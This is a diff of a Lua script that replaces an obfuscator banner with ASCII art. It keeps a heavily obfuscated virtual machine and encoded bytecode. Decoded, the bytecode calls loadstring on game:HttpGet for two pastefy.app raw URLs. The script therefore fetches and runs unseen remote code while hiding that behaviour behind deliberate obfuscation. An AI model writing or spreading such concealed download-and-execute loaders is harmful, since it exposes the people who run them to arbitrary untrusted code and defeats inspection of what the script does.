@@ -1,12 +1,104 @@
 --[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
-
+               \,_     __,----.
+           ,_,-/_   _,' _,'-"""""-.
+          ( : : ,),' _,'_,--"""""---.__
+         _,\ ::',',-'  '_,---""""""---.\                                       ____
+       ,': :\:"'       ' _,''" ___,---.__                              _____,-'. . \ 
+      J : : /          ,'__,--'   _____  \                        _,--::::::: . . . `.
+      L: : /           ,'___,----' ___ `--.                     ,::::::::'   . . . . J
+      J :-'   .       --'          --.`. ) \                 _,:::::'     . . . . . .L 
+      ,' :   : .  ___----.__ --.___ `.`.\  '               ,::::'      . . . . . . .J
+     / : :  : :  ,--::,,   ,`.--.`.`-.`.)               _,::'       . ..::::. . . . L
+     L : ':.::   L::'  ``:/   `. `.\  `.\            _,:::'      . ..:::'. . . . . / 
+    J  .:.':::   F::     J `.   `. \\   \\         ,::::'     . ..::' . .__,-' ..:J 
+    L,::::::::.  J::     F  ,""\  \ LL   \L     ,-:::'    . . .::' ....:'...  ..::L
+ ,-,.''''''''':.  L:    J  J ):.`. `JF    '__,-::::.   . . . .....:;:-'.'    ..::/
+/ . ;;;;;;;''''::.);     \ J/CD:\,F  L:-.-:::::'. . . .  ..:;;;:--'.:''   . ..::/
+L:. _     '''\' (:'         L:;:JP    .::\:::::. . . .:;;:-'   ,::''     . ..::/
+|:.' _,       `._`----.______  "'      .':L:::::::;;:-'       /:'       . ..::'
+J: .::|      .`. "-------""      ._,    .:|::;;;-'          ,:'      . . .::/
+-L:_::J ,    \`.`.                 (     :J-'             ,:'       . . .::'
+::,-`.J J J L\\ `.`.   ,- .         ,'\  .:L             /:      . . ..::/
+ ; ; ,J  L L \``. `-;,' ,,oo        ""'   :J           ,:'      . . ..::'
+ :; :  L J\ \``.``._/_ =dP                ':L         /""""-.  . . .::/ 
+':::..,J`.L \`.\`._J  =dQ                 .:F       ,'       `. ..:::'
+':::    \\`\``.`._ F- =dP. . . . . . . . ;:'       /           L.::/
+' ; :   `.\\\_\`.,-._  ::::::::::::::;:-'        ,'            J::/
+ ;:  `./   `.`.--`._ `-:;:--.;;;;;--'::\       .--.            |\/
+: : __J         J::.`-----@'\::.. . .'::\    ,::'. \           F L
+__::::\         |:::: J      \::.. . .'::\  /:: .'.:L          , J
+J :::::L        F:::: |       L::.. . .'::\/:: .  :.J          L-'
+ L:::::J       J::::: F       J:::.. .  .::\: .  .: .L         F
+ |::::::L      |'':::J      ,-'"""`-. ..  . ..  .::. J        /
+ J::'::.J      F: :::|    ,'         `. . .  ` .::. . L      /
+  L: '::.L    J .  ::F   /             `.......:'. . .J     J
+  |   :: |    F :  :J   J              J \''''''. . . .\    J 
+  J  ,.::J   J  .  :|   | |             \ \. . . . . . .`---.\__ 
+   L,  :::L  F :. .:L   | J              L \. . . . `-.: .      `--.__
+   |  .:::| /. ::.:J    |  L             J  \. . .'. ':`-..           `-._
+   |   ::;J/: :::::F    |  |              \  \       '. . `. .         . dMb 
+   |  ,::;:L: ::::J     |  |               L  L        . . .`..         .`QJ
+   |   ::;:| :::::F     J  J               J   L      . . . . \:.      . . |
+   |   :;::| ::::J       L  L               L  J     . . . . . \:.. . . . .|
+   F  ,';::| ::::F       J  J               J  F. . .,ooo.. . . L::. . . . F
+  J  ,  ;::|: . J         L  \               L/. . ..dM()b . . .J:: . . . J
+  | ,  ;:::J . .F         J   \         __...J: . . .`QMP'. . . J::. . ../
+  |    ;::::L ./           \   L    _,-'   .::L: . . . . . . . .F:: . .:/
+  |    ;::::|./             \  J  ,:::.     ::J:. . . . . . . :/::'. ::'
+  |   ;:::::|/               L  \(\:::       ::L:. . . . . .::/::::::'
+  F   ;::.::|                J   `"L:::      ::J:::.....:::::'::::;'\
+ J    ;:::::|                 \    J:::.     .::L:::::::::,,._,,"    L
+ |   ;::.:::F                  \    \:::.     .:J`,:,,_,,"'"""" . ; .J
+ L   ;::::.J                    L    L::       .:L""""'  .;. .;. ..; J
+J.   ;:.:::|                    J    J::.       :J. . ; . .;. .;.  ;.L
+L   ;::::::|                     \    \::.  . . .:L. . ; . ; . ; .;./
+ .  ;:.::.:F                      \    L::.  . . :J . .;. ;/\ ; ./\(
+.  ;::::::J                        \   J::   :.: .:\ .;. ; \/;/\ \F
+ . ;.:::::|                         \   \::  ::.. .:\;  ./\/\ \ \/
+. ;::::.::|                          \   \:: .::.  .:\ \ \   \/  |
+ ;:.::::::L                           L   L::. ::.. .:`.\/       |
+;:::::::;J                            |   J::   ::.  .::\        J
+:.:::.::;|                            J    L::   ::.  . :`.      |
+:::::::;.|                             L   J::::.  '   . ::\     F
+::::::;. L                             J    \::::.      . .:\   J
+:::.::; J                            ,'      \::::.      . .:\  |
+:::::; .|                         _,'         `.:::::     . ::L F
+::::; . L                       ,'    ,         \::::.     .::JJ
+.:::;. J                      ,'    ,'J    __,   `.:::.     .::\
+:::;. .|                    ,'    ,'   L,-','____, \:::..    .::\
+::;. . L                  ,'    ,'       ,'|        `.::..    .::\ 
+::; . J                 ,'             ,'  |          \::..    .::\ 
+:; . .|                ;'--'M-K"------.____`           `.::.    .::\
+; . . L              ,'                .   `--._         \::.    .::\
+;. . J              /        ,          . . .:::`--.     /`.:.    .::\
+. . .L             /        /            . . .::::::`-.  L  \. .   .::\
+ . .J             J        J            . . . . .::::::`.J   \. .   .::\
+. . L             L       .F             . . . . .::::::\`    \. .   .::\
+ . J             J        J             . . . . . .::::::\     \. .   . .L
+. .L             F        F. .           . . . . . :::::::\     \:.  ..::J
+ .J              F      . J . .         . . . . . .::::::::\     ):  ::::J
+. L              L . . . .:F . .         . . . . . ::: . .::\   /:  ::::.L
+ /               J  . . . .J. . .       . . . . . .:: . . .::\ /.  ::::: L
+/                 \. . . . :\. . . . . . . . . . .:: . . . .::J.  ::::::.L
+                   L. . . .::\. . . . . . . . . .:: . . . . .:L  ::::::: |
+                   L ....:::::`.::...... . . . : .       . . :L. :::::::.|
+                  /:'. '':::::::`.::::::. ..::. .         . . J :::::: . |
+                 J::  . . .:::::::`.:::::::::.             . .,'::::::: .| 
+                 L:      . . .::::::\:::::::. .             ,' .'/ ::.:: J 
+                /:        . . .::::::\:::::: . .          ,' .:'/ ::_ ::.J 
+               J::           . . :::::L:::::. . .       ,'.:''./ ./ / :: :L
+               L:           . . .:::::J::::: . . .      '''  ./ ./ / :J :J
+              J::          . . . ::::::\::::: . . .         ,'.:' / :/L :L
+              |::           . . .:::::J L::::. . . .      ,'.:'  / :/J :J
+              L:           . . . :::::L J:::::. . . .    (_:'   / :/ L :L
+             J::          . . . :::::J   \:::::. . .           / :/ / :/
+             |::           . . .:::::L    \:::: . . .        .'.:' J :/ 
+             |::          . . . ::::J      \:::::. . .      I_:'   L:/ 
+             L:          . . . .::::L       \:::: . . .           J JL 
+            J::           . . .::::J         `.::: . .            L_LJ
+            |::          . . . ::::L           \::::. .           . ::L
+            |::           . . .:::J             `.:: . .           . :|
+            |::          . . .::::L               \:::.           . .:J
 ]]--
 
 local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v82=0;local v83;while true do if (v82==0) then v83=v2(v0(v30,16));if v19 then local v97=0;local v98;while true do if (v97==1) then return v98;end if (v97==0) then v98=v5(v83,v19);v19=nil;v97=1;end end else return v83;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v84=(v31/((5 -3)^(v32-1)))%(2^(((v33-(2 -1)) -(v32-(1 -0))) + (2 -1))) ;return v84-(v84%1) ;else local v85=(621 -(555 + 64))^(v32-(932 -(215 + 642 + 74))) ;return (((v31%(v85 + v85))>=v85) and ((90 + 479) -(367 + 201))) or (927 -(214 + 713)) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + (879 -(282 + 595)) );v18=v18 + (1639 -(1523 + 114)) ;return (v36 * (231 + 25)) + v35 ;end local function v23() local v37=117 -(32 + 85) ;local v38;local v39;local v40;local v41;while true do if (v37==(1 -0)) then return (v41 * (16778281 -(50 + 18 + 997))) + (v40 * (66493 -(892 + 65))) + (v39 * (610 -354)) + v38 ;end if (v37==(0 -0)) then v38,v39,v40,v41=v1(v16,v18,v18 + (4 -1) );v18=v18 + (1274 -(226 + 1044)) ;v37=(9 -5) -3 ;end end end local function v24() local v42=v23();local v43=v23();local v44=1 + 0 ;local v45=(v20(v43,3 -2 ,972 -(802 + 150) ) * ((5 -3)^(57 -(467 -(416 + 26))))) + v42 ;local v46=v20(v43,16 + 5 ,31);local v47=((v20(v43,1029 -(915 + (261 -179)) )==1) and  -(2 -1)) or (1 + 0) ;if (v46==0) then if (v45==(0 -0)) then return v47 * (1187 -(1069 + 118)) ;else v46=(1 + 1) -1 ;v44=0 -0 ;end elseif (v46==(356 + (2991 -1300))) then return ((v45==(0 -0)) and (v47 * (((439 -(145 + 293)) + 0)/(791 -((798 -(44 + 386)) + 423))))) or (v47 * NaN) ;end return v8(v47,v46-(3214 -(3677 -(998 + 488))) ) * (v44 + (v45/((20 -(10 + 8))^((64 + 135) -147)))) ;end local function v25(v48) local v49;if  not v48 then v48=v23();if (v48==(0 + 0)) then return "";end end v49=v3(v16,v18,(v18 + v48) -(773 -(201 + 571)) );v18=v18 + v48 ;local v50={};for v65=1139 -(116 + 1022) , #v49 do v50[v65]=v2(v1(v3(v49,v65,v65)));end return v6(v50);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v51=(function() return 0 -0 ;end)();local v52=(function() return;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();while true do local v67=(function() return 290 -(60 + 230) ;end)();while true do if (v67==(1785 -(599 + 1185))) then if (v51==(575 -(426 + 146))) then for v99= #"~",v23() do local v100=(function() return 0 + 0 ;end)();local v101=(function() return;end)();while true do if (v100==(0 + 0)) then v101=(function() return v21();end)();if (v20(v101, #"}", #"{")==(0 + 0)) then local v141=(function() return 574 -(507 + 67) ;end)();local v142=(function() return;end)();local v143=(function() return;end)();local v144=(function() return;end)();while true do if (v141==(1751 -(1013 + 736))) then if (v20(v143, #"\\", #"!")~= #",") then else v144[813 -(569 + 242) ]=(function() return v58[v144[2 + 0 ]];end)();end if (v20(v143,1 + 1 ,2)== #"~") then v144[ #"-19"]=(function() return v58[v144[ #"asd"]];end)();end v141=(function() return 1027 -(706 + 318) ;end)();end if ((1252 -(721 + 530))~=v141) then else local v161=(function() return 0 -0 ;end)();while true do if (v161~=1) then else v141=(function() return 7 -5 ;end)();break;end if (v161~=(867 -(550 + 317))) then else v144=(function() return {v22(),v22(),nil,nil};end)();if (v142==(0 -0)) then local v175=(function() return 0 -0 ;end)();while true do if ((285 -(134 + 151))==v175) then v144[ #"-19"]=(function() return v22();end)();v144[ #"asd1"]=(function() return v22();end)();break;end end elseif (v142== #"!") then v144[ #"91("]=(function() return v23();end)();elseif (v142==2) then v144[ #"91("]=(function() return v23() -(2^(1516 -(1408 + 92))) ;end)();elseif (v142== #"xxx") then local v181=(function() return 1665 -(970 + 695) ;end)();local v182=(function() return;end)();while true do if (v181==(0 -0)) then v182=(function() return 0;end)();while true do if ((1086 -(461 + 625))==v182) then v144[ #"-19"]=(function() return v23() -((1992 -(582 + 1408))^(1304 -(993 + 295))) ;end)();v144[ #"xnxx"]=(function() return v22();end)();break;end end break;end end end v161=(function() return 1 + 0 ;end)();end end end if (v141==(10 -7)) then if (v20(v143, #"gha", #"asd")== #"!") then v144[ #"xnxx"]=(function() return v58[v144[ #"0313"]];end)();end v53[v99]=(function() return v144;end)();break;end if (v141==(1171 -(418 + 753))) then local v163=(function() return 0;end)();while true do if (v163==(1 -0)) then v141=(function() return 1;end)();break;end if (v163~=0) then else local v174=(function() return 0 -0 ;end)();while true do if (1==v174) then v163=(function() return 1825 -(1195 + 629) ;end)();break;end if (v174==0) then v142=(function() return v20(v101,2, #"91(");end)();v143=(function() return v20(v101, #".dev",2 + 4 );end)();v174=(function() return 1 -0 ;end)();end end end end end end end break;end end end for v102= #"~",v23() do v54,v102,v28=(function() return v52(v54,v102,v28);end)();end return v56;end if (v51~=(242 -(187 + 54))) then else local v93=(function() return 529 -(406 + 123) ;end)();while true do if (1~=v93) then else v57=(function() return v23();end)();v51=(function() return 1771 -(1749 + 20) ;end)();break;end if (v93==(0 + 0)) then v55=(function() return {};end)();v56=(function() return {v53,v54,nil,v55};end)();v93=(function() return 1 + 0 ;end)();end end end break;end if (v67==0) then if (v51~=(780 -(162 + 618))) then else local v94=(function() return 1145 -(466 + 679) ;end)();local v95=(function() return;end)();while true do if (v94~=0) then else v95=(function() return 0;end)();while true do if (v95==(0 + 0)) then local v145=(function() return 0;end)();while true do if ((0 -0)==v145) then v52=(function() return function(v169,v170,v171) local v172=(function() return 1900 -(106 + 1794) ;end)();local v173=(function() return;end)();while true do if (v172==(0 + 0)) then v173=(function() return 0 -0 ;end)();while true do if ((0 -0)==v173) then local v179=(function() return 0 + 0 ;end)();while true do if (v179==0) then v169[v170-#"[" ]=(function() return v171();end)();return v169,v170,v171;end end end end break;end end end;end)();v53=(function() return {};end)();v145=(function() return 1;end)();end if ((1 + 0)==v145) then v95=(function() return 1637 -(1373 + 263) ;end)();break;end end end if (v95==(1001 -(451 + 549))) then v54=(function() return {};end)();v51=(function() return 1 + 0 ;end)();break;end end break;end end end if (2==v51) then local v96=(function() return 0;end)();while true do if (v96~=(0 -0)) then else v58=(function() return {};end)();for v104= #"\\",v57 do local v105=(function() return 0 -0 ;end)();local v106=(function() return;end)();local v107=(function() return;end)();local v108=(function() return;end)();while true do if (v105~=(1385 -(746 + 638))) then else v108=(function() return nil;end)();while true do if (v106~=1) then else if (v107== #",") then v108=(function() return v21()~=(0 + 0) ;end)();elseif (v107==(2 -0)) then v108=(function() return v24();end)();elseif (v107== #"91(") then v108=(function() return v25();end)();end v58[v104]=(function() return v108;end)();break;end if (v106~=(584 -(57 + 527))) then else local v165=(function() return 341 -(218 + 123) ;end)();while true do if (v165==(1582 -(1535 + 46))) then v106=(function() return 1 + 0 ;end)();break;end if (v165~=(0 + 0)) then else v107=(function() return v21();end)();v108=(function() return nil;end)();v165=(function() return 1 + 0 ;end)();end end end end break;end if (0~=v105) then else local v156=(function() return 0 -0 ;end)();while true do if ((561 -(306 + 254))~=v156) then else v105=(function() return 1 + 0 ;end)();break;end if (v156==(0 -0)) then v106=(function() return 0;end)();v107=(function() return nil;end)();v156=(function() return 1468 -(899 + 568) ;end)();end end end end end v96=(function() return 1 + 0 ;end)();end if (v96~=(2 -1)) then else v56[ #"xnx"]=(function() return v21();end)();v51=(function() return 5 -2 ;end)();break;end end end v67=(function() return 3 -2 ;end)();end end end end local function v29(v59,v60,v61) local v62=v59[1 + (214 -(22 + 192)) ];local v63=v59[2 -0 ];local v64=v59[(684 -(483 + 200)) + 2 ];return function(...) local v68=v62;local v69=v63;local v70=v64;local v71=v27;local v72=1 -0 ;local v73= -((1529 -(1404 + 59)) -(30 + 35));local v74={};local v75={...};local v76=v12("#",...) -1 ;local v77={};local v78={};for v86=0 + (0 -0) ,v76 do if ((v86>=v70) or (3315<=2782)) then v74[v86-v70 ]=v75[v86 + (1258 -(1043 + 214)) ];else v78[v86]=v75[v86 + (3 -2) ];end end local v79=(v76-v70) + (1213 -(323 + 889)) ;local v80;local v81;while true do v80=v68[v72];v81=v80[2 -1 ];if (v81<=(590 -(361 + 219))) then if ((v81<=(3 + 1)) or (876>=2964)) then if (v81<=(321 -(53 + 267))) then if ((v81==(0 + 0)) or (2232>2497)) then v72=v80[3];else local v110=v80[415 -(15 + 398) ];local v111,v112=v71(v78[v110](v13(v78,v110 + (983 -(18 + 964)) ,v80[(14 -3) -8 ])));v73=(v112 + v110) -1 ;local v113=0;for v133=v110,v73 do v113=v113 + (766 -(468 + 297)) + 0 ;v78[v133]=v111[v113];end end elseif ((v81<=(2 + 0)) or (2110<=332)) then for v136=v80[852 -(20 + 830) ],v80[(565 -(334 + 228)) + (0 -0) ] do v78[v136]=nil;end elseif (v81>(129 -(116 + 10))) then v78[v80[1 + 1 ]]();elseif ((3686>3172) and (v78[v80[2]]==v80[742 -(542 + 196) ])) then v72=v72 + (1 -0) ;else v72=v80[1 + 2 ];end elseif ((v81<=(4 + 3)) or (4474<820)) then if (v81<=(309 -(244 + 60))) then v78[v80[(2 -1) + 1 ]]=v80[479 -(41 + 435) ]~=(1001 -((1701 -763) + 63)) ;elseif ((4279>=2882) and (v81==(15 -9))) then for v157=v80[1127 -(936 + 189) ],v80[7 -4 ] do v78[v157]=nil;end else v78[v80[1553 -(1126 + 425) ]]();end elseif (v81<=(3 + 5)) then local v115=v80[407 -(34 + 84 + 287) ];local v116,v117=v71(v78[v115](v13(v78,v115 + (3 -2) ,v80[1124 -(118 + 1003) ])));v73=(v117 + v115) -(268 -(176 + 91)) ;local v118=0 -0 ;for v138=v115,v73 do v118=v118 + (378 -(142 + 235)) ;v78[v138]=v116[v118];end elseif (v81==((1337 -(141 + 95)) -(975 + 117))) then do return;end else v78[v80[2]]=v80[13 -10 ]~=0 ;end elseif (v81<=(4 + 11)) then if (v81<=(989 -(553 + 424))) then if ((v81==(20 -9)) or (2029>=3521)) then local v119=v80[6 -4 ];local v120=v78[v80[3 + 0 ]];v78[v119 + 1 + 0 ]=v120;v78[v119]=v120[v80[3 + 1 + 0 ]];else v78[v80[1 + 1 ]]=v80[5 -2 ];end elseif (v81<=(8 + 5)) then local v126=v80[4 -2 ];local v127=v78[v80[7 -4 ]];v78[v126 + (2 -(2 -1)) ]=v127;v78[v126]=v127[v80[8 -4 ]];elseif (v81>((12 -7) + 3 + 6)) then v78[v80[9 -7 ]]=v61[v80[3]];else local v149=v80[5 -3 ];v78[v149]=v78[v149](v13(v78,v149 + (754 -(239 + 514)) ,v73));end elseif (v81<=18) then if (v81<=((677 + 286) -(245 + 702))) then local v131=v80[1 + 1 ];v78[v131]=v78[v131](v13(v78,v131 + (1330 -(797 + 532)) ,v73));elseif (v81>(13 + 4)) then v72=v80[2 + 1 ];else v78[v80[4 -2 ]]=v61[v80[3 + 0 ]];end elseif (v81<=(1221 -(373 + 829))) then do return;end elseif (v81==(751 -(476 + 255))) then if ((v78[v80[1132 -(369 + 761) ]]==v80[3 + 1 + 0 ]) or (2037>=4642)) then v72=v72 + (1 -0) ;else v72=v80[5 -2 ];end else v78[v80[240 -(64 + 174) ]]=v80[1 + 2 ];end v72=v72 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!063Q00028Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403203Q00682Q7470733A2Q2F706173746566792E612Q702F34647957327A33342F72617703203Q00682Q7470733A2Q2F706173746566792E612Q702F59753065576743722F726177001C3Q0012153Q00014Q0006000100013Q0026033Q0002000100010004123Q00020001001215000100013Q00260300010005000100010004123Q0005000100120F000200023Q00120F000300033Q00200D000300030004001215000500054Q0005000600014Q0001000300064Q000E00023Q00022Q000700020001000100120F000200023Q00120F000300033Q00200D000300030004001215000500064Q0005000600014Q0001000300064Q000E00023Q00022Q00070002000100010004123Q001B00010004123Q000500010004123Q001B00010004123Q000200012Q00133Q00017Q00",v9(),...);
